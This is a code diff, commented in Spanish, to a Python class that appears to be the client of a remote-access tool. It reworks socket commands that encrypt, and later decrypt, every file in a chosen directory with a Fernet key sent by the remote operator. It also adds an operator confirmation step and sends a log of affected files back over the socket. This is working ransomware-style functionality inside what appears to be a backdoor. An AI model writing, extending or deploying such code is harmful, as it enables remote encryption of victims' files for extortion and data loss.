@@ -58,10 +58,10 @@ class TCP:
     def enviarArchivo(self, ubicacion):
         sleep(0.05)
         tam = os.path.getsize(ubicacion)
-        paquetes = str(int(tam/self.__chunk))
-        self.__sock.send(paquetes.encode())
+        paquetes = int(tam/self.__chunk)
+        self.__sock.send(str(paquetes).encode())
 
-        sleep(0.05)
+        sleep(0.1)
         with open(ubicacion, 'rb') as archivo:
             info = archivo.read(self.__chunk)
             while info:
@@ -315,38 +315,44 @@ class TCP:
 
     def encrypt(self, cmd):
         key = self.__sock.recv(1024)
-
         directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
 
         if os.path.isdir(directorio):
-            archivos = []
-            for i in os.listdir(directorio):
-                archivo = f"{directorio}/{i}"
-                if os.path.isfile(archivo):
-                    archivos.append(archivo)
+            nombre = self.getNombre(directorio)
+            self.__sock.send(f"ok-{nombre}".encode())
 
-            with open(f"{directorio}/.info.dat", 'w') as texto:
-                f = Fernet(key)
-                cont = 0
-                for i in archivos:
-                    nombre = os.path.basename(i)
-                    with open(i, 'rb') as archivo:
-                        data = archivo.read()
-                    archivo.close()
+            res = self.__sock.recv(1024).decode()
+            if res == 'S':
+                archivos = []
+                for i in os.listdir(directorio):
+                    archivo = f"{directorio}/{i}"
+                    if os.path.isfile(archivo):
+                        archivos.append(archivo)
 
-                    dataEncrypt = f.encrypt(data)
+                with open(f"{directorio}/.info.dat", 'w') as texto:
+                    f = Fernet(key)
+                    cont = 0
+                    for i in archivos:
+                        nombre = os.path.basename(i)
+                        with open(i, 'rb') as archivo:
+                            data = archivo.read()
+                        archivo.close()
 
-                    with open(i, 'wb') as archivo:
-                        archivo.write(dataEncrypt)
-                    archivo.close()
-                    texto.write(f"[+] Archivo \"{nombre}\" encriptado\n")
-                    cont += 1
-            texto.close()
+                        dataEncrypt = f.encrypt(data)
 
-            self.__sock.send(f"{cont} archivos encriptados".encode())
+                        with open(i, 'wb') as archivo:
+                            archivo.write(dataEncrypt)
+                        archivo.close()
+                        texto.write(f"[+] Archivo \"{nombre}\" encriptado\n")
+                        cont += 1
+                texto.close()
 
-            self.enviarArchivo(f"{directorio}/.info.dat")
-            os.remove(f"{directorio}/.info.dat")
+                self.__sock.send(f"{cont} archivos encriptados".encode())
+                self.enviarArchivo(f"{directorio}/.info.dat")
+                os.remove(f"{directorio}/.info.dat")
+
+            else:
+                self.__sock.send("Encriptacion cancelada".encode())
 
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
@@ -357,34 +363,42 @@ class TCP:
         directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
 
         if os.path.isdir(directorio):
-            archivos = []
-            for i in os.listdir(directorio):
-                archivo = f"{directorio}/{i}"
-                if os.path.isfile(archivo):
-                    archivos.append(archivo)
+            nombre = self.getNombre(directorio)
+            self.__sock.send(f"ok-{nombre}".encode())
 
-            with open(f"{directorio}/.{clave}.dat", 'w') as texto:
-                f = Fernet(key)
-                cont = 0
-                for i in archivos:
-                    nombre = os.path.basename(i)
-                    with open(i, 'rb') as archivo:
-                        data = archivo.read()
-                    archivo.close()
+            res = self.__sock.recv(1024).decode()
+            if res == 'S':
+                archivos = []
+                for i in os.listdir(directorio):
+                    archivo = f"{directorio}/{i}"
+                    if os.path.isfile(archivo):
+                        archivos.append(archivo)
 
-                    dataDecrypt = f.decrypt(data)
+                with open(f"{directorio}/.{clave}.dat", 'w') as texto:
+                    f = Fernet(key)
+                    cont = 0
+                    for i in archivos:
+                        nombre = os.path.basename(i)
+                        with open(i, 'rb') as archivo:
+                            data = archivo.read()
+                        archivo.close()
 
-                    with open(i, 'wb') as archivo:
-                        archivo.write(dataDecrypt)
-                    archivo.close()
+                        dataDecrypt = f.decrypt(data)
 
-                    texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
-                    cont += 1
-            texto.close()
+                        with open(i, 'wb') as archivo:
+                            archivo.write(dataDecrypt)
+                        archivo.close()
 
-            self.__sock.send(f"{cont} archivos desencriptados".encode())
-            self.enviarArchivo(f"{directorio}/.{clave}.dat")
-            os.remove(f"{directorio}/.{clave}.dat")
+                        texto.write(f"[+] Archivo \"{nombre}\" desencriptado\n")
+                        cont += 1
+                texto.close()
+
+                self.__sock.send(f"{cont} archivos desencriptados".encode())
+                self.enviarArchivo(f"{directorio}/.{clave}.dat")
+                os.remove(f"{directorio}/.{clave}.dat")
+
+            else:
+                self.__sock.send("Desencriptacion cancelada".encode())
 
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
